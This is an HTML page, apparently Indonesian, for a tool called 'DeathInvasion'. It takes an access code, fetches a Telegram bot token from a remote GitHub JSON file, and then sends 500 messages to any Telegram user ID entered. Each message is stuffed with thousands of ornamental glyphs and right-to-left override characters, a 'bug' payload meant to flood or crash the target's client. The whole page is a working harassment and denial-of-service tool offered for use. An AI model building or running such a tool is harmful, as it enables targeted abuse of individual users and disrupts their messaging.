<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <title>DeathInvasion</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    html, body {
      height: 100%;
      background: #0a0a0a;
      color: #00ff00;
      font-family: 'Segoe UI', sans-serif;
    }

    .container {
      height: 100%;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 4rem;
    }

    .login-box {
      background: #161616;
      padding: 4rem;
      border-radius: 16px;
      box-shadow: 0 0 50px rgba(0, 255, 0, 0.3);
      width: 100%;
      max-width: 700px;
      text-align: center;
    }

    h1 {
      margin-bottom: 2.5rem;
      font-size: 3rem;
      color: #00ff00;
    }

    input {
      width: 100%;
      padding: 1.4rem;
      font-size: 1.5rem;
      margin-bottom: 2rem;
      border-radius: 10px;
      border: none;
      background: #222;
      color: #0f0;
    }

    button {
      width: 100%;
      padding: 1.4rem;
      font-size: 1.5rem;
      background: #0f0;
      color: #000;
      border: none;
      border-radius: 10px;
      cursor: pointer;
      transition: background 0.3s;
    }

    button:hover {
      background: #00cc00;
    }

    #main, #target-section {
      margin-top: 2.5rem;
      display: none;
    }

    label {
      font-size: 1.3rem;
      margin-bottom: 1rem;
      display: block;
      color: #aaa;
    }
  </style>
</head>
<body>

  <div class="container">
    <div class="login-box">
      <h1>üíÄ DeathInvasion Login</h1>

      <div id="login">
        <input type="text" id="code-token" placeholder="Masukkan kode akses">
        <button onclick="verifyCode()">üîì Masuk</button>
      </div>

      <div id="main">
        <div id="target-section">
          <label for="target-id">Masukkan ID Telegram Target:</label>
          <input type="text" id="target-id" placeholder="contoh: 123456789">
          <button onclick="sendBug()">üöÄ Kirim Bug</button>
        </div>
      </div>
    </div>
  </div>

  <script>
    let BOT_TOKEN = "";

    async function verifyCode() {
      const code = document.getElementById('code-token').value.trim();
      if (!code) return alert("Masukkan kode dulu üòπ");

      try {
        const response = await fetch("https://raw.githubusercontent.com/BimxyzDev/Deathinvasion/main/key-folder/key.json");
        const data = await response.json();

        const entry = data.find(item => item.code === code);
        if (!entry) return alert("‚ùå Kode salah!");

        BOT_TOKEN = entry.token;

        document.getElementById('login').style.display = "none";
        document.getElementById('main').style.display = "block";
        document.getElementById('target-section').style.display = "block";
      } catch (err) {
        console.error(err);
        alert("‚ùå Gagal memverifikasi kode");
      }
    }

    async function sendBug() {
      const targetId = document.getElementById('target-id').value.trim();
      if (!targetId) return alert("Isi ID dulu üòπ");

      const ultraBug = "ÍßÖÍßÑ‡ºíÔ∏é".repeat(2048) + "\u202e".repeat(2048);
      const payload = {
        chat_id: targetId,
        text: `üí£ *DEATH INVASION FINAL STRIKE* üí£\n\n` + ultraBug,
        parse_mode: "Markdown"
      };

      for (let i = 1; i <= 500; i++) {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload)
        });

        console.log(`üí• Kirim [${i}/5]`);
        await new Promise(res => setTimeout(res, 700));
      }

      alert("‚úÖ Bug sukses terkirim!");
    }
  </script>

</body>
</html>
